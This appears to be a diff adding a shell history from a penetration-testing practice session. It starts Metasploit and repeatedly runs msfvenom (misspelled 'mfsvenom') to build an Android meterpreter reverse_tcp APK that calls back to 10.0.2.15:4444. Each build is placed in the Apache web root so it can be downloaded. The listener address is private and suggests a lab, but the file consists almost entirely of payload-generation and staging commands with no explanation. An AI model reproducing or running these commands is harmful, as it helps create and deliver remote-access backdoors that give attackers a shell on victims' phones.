@@ -1,0 +1,18 @@
+sudo msfconsole
+locate apache2
+cd conf-available
+cd usr
+cd share
+cd apache2
+cd var/www/html/
+apache2
+service apache2 status
+mfsvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > var/www/html/androidSamp.apk
+sudo mfsvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > var/www/html/androidSamp.apk
+sudo mfsvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > var/www/html/android.apk
+cd..
+sudo mfsvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > var/www/html/android.apk
+cd ..
+ls
+sudo mfsvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > var/www/html/android.apk
+sudo mfsvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > var/www/html/android1.apk
